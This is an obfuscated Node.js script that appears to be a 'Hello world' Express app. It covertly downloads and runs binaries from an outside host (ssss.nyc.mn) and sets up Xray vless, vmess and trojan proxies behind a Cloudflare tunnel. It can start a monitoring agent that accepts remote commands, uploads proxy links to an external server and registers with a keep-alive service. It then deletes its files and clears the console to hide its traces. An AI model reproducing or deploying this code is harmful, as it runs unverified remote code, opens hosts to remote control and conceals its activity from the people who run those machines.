const _0x2ca40a=_0x6b55;(function(_0x45fa2b,_0x25fc2b){const _0x4460c2=_0x6b55,_0xf47f94=_0x45fa2b();while(!![]){try{const _0x582c77=parseInt(_0x4460c2(0x17f))/0x1+parseInt(_0x4460c2(0x1c5))/0x2*(parseInt(_0x4460c2(0x135))/0x3)+-parseInt(_0x4460c2(0x112))/0x4*(-parseInt(_0x4460c2(0x13c))/0x5)+parseInt(_0x4460c2(0x11a))/0x6+parseInt(_0x4460c2(0x113))/0x7*(parseInt(_0x4460c2(0x155))/0x8)+-parseInt(_0x4460c2(0x14f))/0x9*(parseInt(_0x4460c2(0x138))/0xa)+-parseInt(_0x4460c2(0x195))/0xb;if(_0x582c77===_0x25fc2b)break;else _0xf47f94['push'](_0xf47f94['shift']());}catch(_0x18d487){_0xf47f94['push'](_0xf47f94['shift']());}}}(_0x3972,0x1da1e));const express=require(_0x2ca40a(0x1b9)),app=express(),axios=require(_0x2ca40a(0x1bc)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x2ca40a(0x14b)),exec=promisify(require('child_process')[_0x2ca40a(0x19d)]),{execSync}=require(_0x2ca40a(0x148)),UPLOAD_URL=process['env'][_0x2ca40a(0x18a)]||'',PROJECT_URL=process[_0x2ca40a(0x1af)][_0x2ca40a(0x1a9)]||'',AUTO_ACCESS=process[_0x2ca40a(0x1af)][_0x2ca40a(0x144)]||![],FILE_PATH=process[_0x2ca40a(0x1af)][_0x2ca40a(0x1a4)]||_0x2ca40a(0x125),SUB_PATH=process[_0x2ca40a(0x1af)][_0x2ca40a(0x15c)]||_0x2ca40a(0x1b1),PORT=process[_0x2ca40a(0x1af)][_0x2ca40a(0x1a0)]||process[_0x2ca40a(0x1af)][_0x2ca40a(0x1b6)]||0xbb8,UUID=process[_0x2ca40a(0x1af)][_0x2ca40a(0x18f)]||_0x2ca40a(0x171),NEZHA_SERVER=process[_0x2ca40a(0x1af)][_0x2ca40a(0x196)]||'',NEZHA_PORT=process['env'][_0x2ca40a(0x175)]||'',NEZHA_KEY=process[_0x2ca40a(0x1af)][_0x2ca40a(0x19b)]||'',ARGO_DOMAIN=process['env'][_0x2ca40a(0x128)]||'',ARGO_AUTH=process[_0x2ca40a(0x1af)][_0x2ca40a(0x17d)]||'',ARGO_PORT=process[_0x2ca40a(0x1af)][_0x2ca40a(0x166)]||0x1f41,CFIP=process[_0x2ca40a(0x1af)][_0x2ca40a(0x130)]||_0x2ca40a(0x167),CFPORT=process[_0x2ca40a(0x1af)]['CFPORT']||0x1bb,NAME=process[_0x2ca40a(0x1af)][_0x2ca40a(0x14c)]||_0x2ca40a(0x160);!fs[_0x2ca40a(0x157)](FILE_PATH)?(fs[_0x2ca40a(0x12b)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x2ca40a(0x1bb)](FILE_PATH+_0x2ca40a(0x14a));function generateRandomName(){const _0x3ad947=_0x2ca40a,_0xe2fa57=_0x3ad947(0x12f);let _0x5d0720='';for(let _0x50383f=0x0;_0x50383f<0x6;_0x50383f++){_0x5d0720+=_0xe2fa57[_0x3ad947(0x18e)](Math[_0x3ad947(0x189)](Math['random']()*_0xe2fa57['length']));}return _0x5d0720;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x2ca40a(0x174)](FILE_PATH,webName),botPath=path[_0x2ca40a(0x174)](FILE_PATH,botName),subPath=path[_0x2ca40a(0x174)](FILE_PATH,_0x2ca40a(0x173)),listPath=path[_0x2ca40a(0x174)](FILE_PATH,_0x2ca40a(0x177)),bootLogPath=path[_0x2ca40a(0x174)](FILE_PATH,_0x2ca40a(0x149)),configPath=path[_0x2ca40a(0x174)](FILE_PATH,'config.json');function deleteNodes(){const _0x23b279=_0x2ca40a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x171323;try{_0x171323=fs['readFileSync'](subPath,_0x23b279(0x1aa));}catch{return null;}const _0x20b371=Buffer[_0x23b279(0x120)](_0x171323,'base64')[_0x23b279(0x199)](_0x23b279(0x1aa)),_0x50b6a3=_0x20b371[_0x23b279(0x165)]('\x0a')['filter'](_0x44e234=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x23b279(0x185)](_0x44e234));if(_0x50b6a3['length']===0x0)return;return axios[_0x23b279(0x114)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x23b279(0x194)]({'nodes':_0x50b6a3}),{'headers':{'Content-Type':_0x23b279(0x1a1)}})[_0x23b279(0x1b4)](_0x5cb684=>{return null;}),null;}catch(_0x4237b1){return null;}}function cleanupOldFiles(){const _0x58180f=_0x2ca40a;try{const _0x5401b0=fs[_0x58180f(0x178)](FILE_PATH);_0x5401b0[_0x58180f(0x108)](_0x1c5a7a=>{const _0x368227=_0x58180f,_0x45153b=path[_0x368227(0x174)](FILE_PATH,_0x1c5a7a);try{const _0x1f4a46=fs[_0x368227(0x1b8)](_0x45153b);_0x1f4a46[_0x368227(0x1c2)]()&&fs['unlinkSync'](_0x45153b);}catch(_0x3448c6){}});}catch(_0x472c40){}}app[_0x2ca40a(0x1b2)]('/',function(_0x3a29f5,_0x1c5e18){const _0x3fd351=_0x2ca40a;_0x1c5e18[_0x3fd351(0x183)](_0x3fd351(0x134));});async function generateConfig(){const _0x3d3bac=_0x2ca40a,_0x3314d0={'log':{'access':_0x3d3bac(0x1ac),'error':_0x3d3bac(0x1ac),'loglevel':_0x3d3bac(0x10e)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3d3bac(0x10e),'fallbacks':[{'dest':0xbb9},{'path':_0x3d3bac(0x18b),'dest':0xbba},{'path':_0x3d3bac(0x10a),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3d3bac(0x1a8),'settings':{'clients':[{'id':UUID}],'decryption':_0x3d3bac(0x10e)},'streamSettings':{'network':_0x3d3bac(0x17a),'security':_0x3d3bac(0x10e)}},{'port':0xbba,'listen':_0x3d3bac(0x147),'protocol':_0x3d3bac(0x1a8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3d3bac(0x10e)},'streamSettings':{'network':'ws','security':_0x3d3bac(0x10e),'wsSettings':{'path':_0x3d3bac(0x18b)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3d3bac(0x156),_0x3d3bac(0x187)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3d3bac(0x10b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3d3bac(0x10a)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d3bac(0x1be),'tls',_0x3d3bac(0x187)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3d3bac(0x147),'protocol':_0x3d3bac(0x1b5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3d3bac(0x136)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d3bac(0x1be),_0x3d3bac(0x156),_0x3d3bac(0x187)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x3d3bac(0x19a),'tag':_0x3d3bac(0x164)}]};fs['writeFileSync'](path[_0x3d3bac(0x174)](FILE_PATH,_0x3d3bac(0x140)),JSON[_0x3d3bac(0x194)](_0x3314d0,null,0x2));}function getSystemArchitecture(){const _0x42e2a7=_0x2ca40a,_0x1b09bb=os[_0x42e2a7(0x115)]();return _0x1b09bb===_0x42e2a7(0x15d)||_0x1b09bb===_0x42e2a7(0x181)||_0x1b09bb===_0x42e2a7(0x15e)?_0x42e2a7(0x15d):_0x42e2a7(0x116);}function _0x6b55(_0x4033bf,_0x3f1d52){const _0x397290=_0x3972();return _0x6b55=function(_0x41a3da,_0x41b503){_0x41a3da=_0x41a3da-0x108;let _0xd305f7=_0x397290[_0x41a3da];return _0xd305f7;},_0x6b55(_0x4033bf,_0x3f1d52);}function downloadFile(_0x4e2ccc,_0xc6ac1,_0x1566af){const _0x2b5a1e=_0x2ca40a,_0x4dc55f=_0x4e2ccc;!fs[_0x2b5a1e(0x157)](FILE_PATH)&&fs[_0x2b5a1e(0x12b)](FILE_PATH,{'recursive':!![]});const _0x38534c=fs[_0x2b5a1e(0x11e)](_0x4dc55f);axios({'method':_0x2b5a1e(0x1b2),'url':_0xc6ac1,'responseType':_0x2b5a1e(0x12e)})['then'](_0x382149=>{const _0x51de8e=_0x2b5a1e;_0x382149[_0x51de8e(0x158)][_0x51de8e(0x143)](_0x38534c),_0x38534c['on']('finish',()=>{const _0x4c939d=_0x51de8e;_0x38534c[_0x4c939d(0x12c)](),console[_0x4c939d(0x1bb)](_0x4c939d(0x139)+path[_0x4c939d(0x1a5)](_0x4dc55f)+_0x4c939d(0x1ad)),_0x1566af(null,_0x4dc55f);}),_0x38534c['on'](_0x51de8e(0x197),_0x60056c=>{const _0xb989a0=_0x51de8e;fs[_0xb989a0(0x180)](_0x4dc55f,()=>{});const _0x4b0c68=_0xb989a0(0x139)+path[_0xb989a0(0x1a5)](_0x4dc55f)+_0xb989a0(0x1c6)+_0x60056c[_0xb989a0(0x110)];console[_0xb989a0(0x197)](_0x4b0c68),_0x1566af(_0x4b0c68);});})[_0x2b5a1e(0x1b4)](_0x4107f5=>{const _0x2c7f96=_0x2b5a1e,_0x3cd8be='Download\x20'+path[_0x2c7f96(0x1a5)](_0x4dc55f)+_0x2c7f96(0x1c6)+_0x4107f5['message'];console['error'](_0x3cd8be),_0x1566af(_0x3cd8be);});}async function downloadFilesAndRun(){const _0x53b03e=_0x2ca40a,_0x23615d=getSystemArchitecture(),_0x214076=getFilesForArchitecture(_0x23615d);if(_0x214076[_0x53b03e(0x145)]===0x0){console[_0x53b03e(0x1bb)](_0x53b03e(0x191));return;}const _0x3d1afd=_0x214076[_0x53b03e(0x1bf)](_0x549c69=>{return new Promise((_0x23a762,_0x3bf3ff)=>{const _0x59f091=_0x6b55;downloadFile(_0x549c69[_0x59f091(0x127)],_0x549c69[_0x59f091(0x16c)],(_0x17eff7,_0x369d2a)=>{_0x17eff7?_0x3bf3ff(_0x17eff7):_0x23a762(_0x369d2a);});});});try{await Promise[_0x53b03e(0x126)](_0x3d1afd);}catch(_0x5e08a7){console['error'](_0x53b03e(0x11c),_0x5e08a7);return;}function _0x348dfc(_0x426796){const _0x36e2ee=0x1fd;_0x426796['forEach'](_0x53a6b7=>{const _0x4e5e09=_0x6b55;fs[_0x4e5e09(0x157)](_0x53a6b7)&&fs[_0x4e5e09(0x1b0)](_0x53a6b7,_0x36e2ee,_0xf34a4c=>{const _0x2fabdb=_0x4e5e09;_0xf34a4c?console[_0x2fabdb(0x197)](_0x2fabdb(0x17e)+_0x53a6b7+':\x20'+_0xf34a4c):console[_0x2fabdb(0x1bb)]('Empowerment\x20success\x20for\x20'+_0x53a6b7+':\x20'+_0x36e2ee['toString'](0x8));});});}const _0x2ef90c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x348dfc(_0x2ef90c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5de45e=NEZHA_SERVER[_0x53b03e(0x1ab)](':')?NEZHA_SERVER[_0x53b03e(0x165)](':')[_0x53b03e(0x1b3)]():'',_0x47584d=new Set([_0x53b03e(0x137),_0x53b03e(0x16f),_0x53b03e(0x1c4),'2087',_0x53b03e(0x13d),'2053']),_0x3f1b99=_0x47584d[_0x53b03e(0x1c1)](_0x5de45e)?'true':_0x53b03e(0x10c),_0x5206fc=_0x53b03e(0x16b)+NEZHA_KEY+_0x53b03e(0x184)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3f1b99+_0x53b03e(0x15b)+UUID;fs[_0x53b03e(0x1a3)](path[_0x53b03e(0x174)](FILE_PATH,_0x53b03e(0x190)),_0x5206fc);const _0x54b335=_0x53b03e(0x129)+phpPath+_0x53b03e(0x18d)+FILE_PATH+_0x53b03e(0x16a);try{await exec(_0x54b335),console[_0x53b03e(0x1bb)](phpName+'\x20is\x20running'),await new Promise(_0x4aaeb8=>setTimeout(_0x4aaeb8,0x3e8));}catch(_0x2fe306){console['error'](_0x53b03e(0x122)+_0x2fe306);}}else{let _0x4ef638='';const _0x40fa87=[_0x53b03e(0x137),'8443',_0x53b03e(0x1c4),'2087',_0x53b03e(0x13d),_0x53b03e(0x17c)];_0x40fa87[_0x53b03e(0x1ab)](NEZHA_PORT)&&(_0x4ef638='--tls');const _0x381519=_0x53b03e(0x129)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4ef638+_0x53b03e(0x19c);try{await exec(_0x381519),console[_0x53b03e(0x1bb)](npmName+_0x53b03e(0x162)),await new Promise(_0x4fd4a8=>setTimeout(_0x4fd4a8,0x3e8));}catch(_0x2efe65){console[_0x53b03e(0x197)]('npm\x20running\x20error:\x20'+_0x2efe65);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1a0f4d=_0x53b03e(0x129)+webPath+_0x53b03e(0x1a7)+FILE_PATH+_0x53b03e(0x11d);try{await exec(_0x1a0f4d),console[_0x53b03e(0x1bb)](webName+_0x53b03e(0x162)),await new Promise(_0x223a3b=>setTimeout(_0x223a3b,0x3e8));}catch(_0x4e0fb1){console[_0x53b03e(0x197)](_0x53b03e(0x13e)+_0x4e0fb1);}if(fs[_0x53b03e(0x157)](botPath)){let _0x2c3ed6;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2c3ed6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2c3ed6=_0x53b03e(0x12d)+FILE_PATH+_0x53b03e(0x1ae):_0x2c3ed6=_0x53b03e(0x11b)+FILE_PATH+_0x53b03e(0x1ba)+ARGO_PORT;try{await exec(_0x53b03e(0x129)+botPath+'\x20'+_0x2c3ed6+_0x53b03e(0x109)),console[_0x53b03e(0x1bb)](botName+'\x20is\x20running'),await new Promise(_0x57c9e3=>setTimeout(_0x57c9e3,0x7d0));}catch(_0x57f25c){console[_0x53b03e(0x197)](_0x53b03e(0x118)+_0x57f25c);}}await new Promise(_0x477504=>setTimeout(_0x477504,0x1388));}function getFilesForArchitecture(_0x5c170f){const _0x17bea7=_0x2ca40a;let _0x433884;_0x5c170f===_0x17bea7(0x15d)?_0x433884=[{'fileName':webPath,'fileUrl':_0x17bea7(0x170)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x433884=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2219c6=_0x5c170f===_0x17bea7(0x15d)?_0x17bea7(0x142):_0x17bea7(0x13f);_0x433884['unshift']({'fileName':npmPath,'fileUrl':_0x2219c6});}else{const _0x461883=_0x5c170f===_0x17bea7(0x15d)?'https://arm64.ssss.nyc.mn/v1':_0x17bea7(0x168);_0x433884[_0x17bea7(0x179)]({'fileName':phpPath,'fileUrl':_0x461883});}}return _0x433884;}function argoType(){const _0x3a07c6=_0x2ca40a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3a07c6(0x1bb)](_0x3a07c6(0x188));return;}if(ARGO_AUTH[_0x3a07c6(0x1ab)](_0x3a07c6(0x150))){fs['writeFileSync'](path[_0x3a07c6(0x174)](FILE_PATH,_0x3a07c6(0x111)),ARGO_AUTH);const _0x4fdcf9='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3a07c6(0x165)]('\x22')[0xb]+_0x3a07c6(0x161)+path[_0x3a07c6(0x174)](FILE_PATH,_0x3a07c6(0x111))+_0x3a07c6(0x153)+ARGO_DOMAIN+_0x3a07c6(0x14e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3a07c6(0x1a3)](path[_0x3a07c6(0x174)](FILE_PATH,_0x3a07c6(0x15a)),_0x4fdcf9);}else console['log'](_0x3a07c6(0x19e));}argoType();async function extractDomains(){const _0x4ace32=_0x2ca40a;let _0x32545e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x32545e=ARGO_DOMAIN,console[_0x4ace32(0x1bb)](_0x4ace32(0x13b),_0x32545e),await _0x26325b(_0x32545e);else try{const _0x51e15c=fs[_0x4ace32(0x12a)](path[_0x4ace32(0x174)](FILE_PATH,_0x4ace32(0x149)),_0x4ace32(0x1aa)),_0x38280a=_0x51e15c[_0x4ace32(0x165)]('\x0a'),_0x57dd4d=[];_0x38280a['forEach'](_0x216ab3=>{const _0x3b85b4=_0x4ace32,_0x8050a7=_0x216ab3[_0x3b85b4(0x154)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x8050a7){const _0x204547=_0x8050a7[0x1];_0x57dd4d[_0x3b85b4(0x169)](_0x204547);}});if(_0x57dd4d['length']>0x0)_0x32545e=_0x57dd4d[0x0],console[_0x4ace32(0x1bb)](_0x4ace32(0x10f),_0x32545e),await _0x26325b(_0x32545e);else{console[_0x4ace32(0x1bb)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4ace32(0x124)](path[_0x4ace32(0x174)](FILE_PATH,_0x4ace32(0x149)));async function _0x8748db(){const _0x2a63c2=_0x4ace32;try{process[_0x2a63c2(0x186)]===_0x2a63c2(0x133)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x2a63c2(0x121)+botName[_0x2a63c2(0x18e)](0x0)+']'+botName[_0x2a63c2(0x193)](0x1)+_0x2a63c2(0x16d));}catch(_0x339c18){}}_0x8748db(),await new Promise(_0xec99f2=>setTimeout(_0xec99f2,0xbb8));const _0x10449b=_0x4ace32(0x11b)+FILE_PATH+_0x4ace32(0x1ba)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x10449b+'\x20>/dev/null\x202>&1\x20&'),console[_0x4ace32(0x1bb)](botName+_0x4ace32(0x162)),await new Promise(_0x24042e=>setTimeout(_0x24042e,0xbb8)),await extractDomains();}catch(_0x2afc49){console[_0x4ace32(0x197)](_0x4ace32(0x118)+_0x2afc49);}}}catch(_0x46fc29){console['error'](_0x4ace32(0x14d),_0x46fc29);}async function _0x26325b(_0x30d047){const _0x33220c=_0x4ace32,_0x4e9b73=execSync(_0x33220c(0x159),{'encoding':_0x33220c(0x1aa)}),_0x126bd0=_0x4e9b73['trim'](),_0x16fb75=NAME?NAME+'-'+_0x126bd0:_0x126bd0;return new Promise(_0x12bd6f=>{setTimeout(()=>{const _0x41488d=_0x6b55,_0x4c9332={'v':'2','ps':''+_0x16fb75,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x41488d(0x10e),'net':'ws','type':'none','host':_0x30d047,'path':_0x41488d(0x17b),'tls':_0x41488d(0x156),'sni':_0x30d047,'alpn':'','fp':_0x41488d(0x119)},_0x56eaf8=_0x41488d(0x163)+UUID+'@'+CFIP+':'+CFPORT+_0x41488d(0x141)+_0x30d047+'&fp=firefox&type=ws&host='+_0x30d047+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x16fb75+_0x41488d(0x198)+Buffer[_0x41488d(0x120)](JSON[_0x41488d(0x194)](_0x4c9332))['toString'](_0x41488d(0x192))+_0x41488d(0x13a)+UUID+'@'+CFIP+':'+CFPORT+_0x41488d(0x11f)+_0x30d047+_0x41488d(0x131)+_0x30d047+_0x41488d(0x151)+_0x16fb75+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x41488d(0x120)](_0x56eaf8)[_0x41488d(0x199)](_0x41488d(0x192))),fs[_0x41488d(0x1a3)](subPath,Buffer[_0x41488d(0x120)](_0x56eaf8)[_0x41488d(0x199)](_0x41488d(0x192))),console[_0x41488d(0x1bb)](FILE_PATH+_0x41488d(0x19f)),uploadNodes(),app['get']('/'+SUB_PATH,(_0xa7a36,_0x185244)=>{const _0x14ceaf=_0x41488d,_0x3de18e=Buffer[_0x14ceaf(0x120)](_0x56eaf8)[_0x14ceaf(0x199)](_0x14ceaf(0x192));_0x185244['set'](_0x14ceaf(0x18c),'text/plain;\x20charset=utf-8'),_0x185244[_0x14ceaf(0x183)](_0x3de18e);}),_0x12bd6f(_0x56eaf8);},0x7d0);});}}async function uploadNodes(){const _0xb31001=_0x2ca40a;if(UPLOAD_URL&&PROJECT_URL){const _0x635425=PROJECT_URL+'/'+SUB_PATH,_0x292bb8={'subscription':[_0x635425]};try{const _0x4ba207=await axios['post'](UPLOAD_URL+_0xb31001(0x182),_0x292bb8,{'headers':{'Content-Type':_0xb31001(0x1a1)}});return _0x4ba207&&_0x4ba207[_0xb31001(0x172)]===0xc8?(console[_0xb31001(0x1bb)]('Subscription\x20uploaded\x20successfully'),_0x4ba207):null;}catch(_0x17b075){if(_0x17b075[_0xb31001(0x1bd)]){if(_0x17b075[_0xb31001(0x1bd)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xb31001(0x157)](listPath))return;const _0x1513c9=fs[_0xb31001(0x12a)](listPath,'utf-8'),_0x16da5b=_0x1513c9[_0xb31001(0x165)]('\x0a')[_0xb31001(0x123)](_0x55146a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xb31001(0x185)](_0x55146a));if(_0x16da5b[_0xb31001(0x145)]===0x0)return;const _0x595df2=JSON[_0xb31001(0x194)]({'nodes':_0x16da5b});try{const _0x1a2275=await axios[_0xb31001(0x114)](UPLOAD_URL+_0xb31001(0x10d),_0x595df2,{'headers':{'Content-Type':_0xb31001(0x1a1)}});return _0x1a2275&&_0x1a2275[_0xb31001(0x172)]===0xc8?(console[_0xb31001(0x1bb)]('Nodes\x20uploaded\x20successfully'),_0x1a2275):null;}catch(_0x2c6e85){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x61379=_0x6b55,_0x56101a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x56101a[_0x61379(0x169)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x56101a['push'](phpPath);process['platform']===_0x61379(0x133)?exec(_0x61379(0x132)+_0x56101a[_0x61379(0x174)]('\x20')+_0x61379(0x1a6),_0x8c591e=>{const _0x990ca9=_0x61379;console[_0x990ca9(0x1c3)](),console['log']('App\x20is\x20running'),console[_0x990ca9(0x1bb)](_0x990ca9(0x152));}):exec(_0x61379(0x1c0)+_0x56101a[_0x61379(0x174)]('\x20')+_0x61379(0x16e),_0x1ba3fb=>{const _0x51c057=_0x61379;console[_0x51c057(0x1c3)](),console[_0x51c057(0x1bb)](_0x51c057(0x117)),console[_0x51c057(0x1bb)](_0x51c057(0x152));});},0x15f90);}cleanFiles();function _0x3972(){const _0x492b10=['10fQoMeT','\x20failed:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','forEach','\x20>/dev/null\x202>&1\x20&','/vmess-argo','vmess','false','/api/add-nodes','none','ArgoDomain:','message','tunnel.json','376276RrAyCQ','7063StpERc','post','arch','amd','App\x20is\x20running','Error\x20executing\x20command:\x20','firefox','556356sEKCle','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Error\x20downloading\x20files:','/config.json\x20>/dev/null\x202>&1\x20&','createWriteStream','?security=tls&sni=','from','pkill\x20-f\x20\x22[','php\x20running\x20error:\x20','filter','unlinkSync','./tmp','all','fileName','ARGO_DOMAIN','nohup\x20','readFileSync','mkdirSync','close','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','stream','abcdefghijklmnopqrstuvwxyz','CFIP','&fp=firefox&type=ws&host=','del\x20/f\x20/q\x20','win32','Hello\x20world!','75807GlbKeF','/trojan-argo','443','20OZlPLc','Download\x20','\x0a\x20\x20\x0atrojan://','ARGO_DOMAIN:','10DEcznp','2083','web\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/agent','config.json','?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/agent','pipe','AUTO_ACCESS','length','http\x20server\x20is\x20running\x20on\x20port:','127.0.0.1','child_process','boot.log','\x20already\x20exists','util','NAME','Error\x20reading\x20boot.log:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','1000935buvosq','TunnelSecret','&path=%2Ftrojan-argo%3Fed%3D2560#','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','match','376ppYTJd','tls','existsSync','data','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','tunnel.yml','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','SUB_PATH','arm','aarch64','Unhandled\x20error\x20in\x20startserver:','rajd1129','\x0a\x20\x20credentials-file:\x20','\x20is\x20running','\x0avless://','block','split','ARGO_PORT','cdns.doon.eu.org','https://amd64.ssss.nyc.mn/v1','push','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','fileUrl','\x22\x20>\x20/dev/null\x202>&1','\x20>/dev/null\x202>&1','8443','https://arm64.ssss.nyc.mn/web','036d83db-9b87-40a9-838f-d99a86bfa280','status','sub.txt','join','NEZHA_PORT','Skipping\x20adding\x20automatic\x20access\x20task','list.txt','readdirSync','unshift','tcp','/vmess-argo?ed=2560','2053','ARGO_AUTH','Empowerment\x20failed\x20for\x20','180195sDzKEL','unlink','arm64','/api/add-subscriptions','send','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','test','platform','quic','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','floor','UPLOAD_URL','/vless-argo','Content-Type','\x20-c\x20\x22','charAt','UUID','config.yaml','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','base64','substring','stringify','3201253rpoFoY','NEZHA_SERVER','error','\x0a\x20\x20\x0avmess://','toString','blackhole','NEZHA_KEY','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','exec','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/sub.txt\x20saved\x20successfully','SERVER_PORT','application/json','automatic\x20access\x20task\x20added\x20successfully','writeFileSync','FILE_PATH','basename','\x20>\x20nul\x202>&1','\x20-c\x20','vless','PROJECT_URL','utf-8','includes','/dev/null','\x20successfully','/tunnel.yml\x20run','env','chmod','sub','get','pop','catch','trojan','PORT','Error\x20in\x20startserver:','statSync','express','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','log','axios','response','http','map','rm\x20-rf\x20','has','isFile','clear','2096'];_0x3972=function(){return _0x492b10;};return _0x3972();}async function AddVisitTask(){const _0x10cbe6=_0x2ca40a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x10cbe6(0x1bb)](_0x10cbe6(0x176));return;}try{const _0x277ae8=await axios[_0x10cbe6(0x114)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x10cbe6(0x1a1)}});return console[_0x10cbe6(0x1bb)](_0x10cbe6(0x1a2)),_0x277ae8;}catch(_0x7e0c4c){return console[_0x10cbe6(0x197)](_0x10cbe6(0x1c7)+_0x7e0c4c['message']),null;}}async function startserver(){const _0x2263c0=_0x2ca40a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x262fd9){console[_0x2263c0(0x197)](_0x2263c0(0x1b7),_0x262fd9);}}startserver()[_0x2ca40a(0x1b4)](_0x306d04=>{const _0x5b775b=_0x2ca40a;console[_0x5b775b(0x197)](_0x5b775b(0x15f),_0x306d04);}),app['listen'](PORT,()=>console[_0x2ca40a(0x1bb)](_0x2ca40a(0x146)+PORT+'!'));
